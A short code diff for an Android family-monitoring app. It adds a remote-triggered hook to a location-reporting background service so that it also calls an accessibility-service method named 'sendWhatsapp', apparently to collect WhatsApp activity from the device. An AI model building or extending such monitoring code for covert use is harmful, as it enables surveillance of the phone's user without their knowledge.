@@ -17,6 +17,7 @@ import android.util.Log;
 import androidx.annotation.Nullable;
 import androidx.core.app.ActivityCompat;
 
+import com.family.accessibility.MyAccessibilityService;
 import com.family.familyprotector.Device;
 import com.family.familyprotector.LocationOnce;
 import com.family.familyprotector.Logger;
@@ -49,7 +50,7 @@ public class GoogleService extends Service implements LocationListener {
     private Handler SecondHandler = new Handler();
     private Timer SecondTimer = null;
 
-    public static boolean sendNow = false;
+    public static boolean sendNow = false, sendWhatsapp = false;
 
 
     public GoogleService() { }
@@ -93,6 +94,10 @@ public class GoogleService extends Service implements LocationListener {
                     public void run() {
                         if(sendNow) {
                             fn_getlocation(0L,0L);
+                        }
+                        if(sendWhatsapp && MyAccessibilityService.activities != null) {
+                            MyAccessibilityService.sendWhatsapp();
+                            sendWhatsapp = false;
                         }
 
                     }
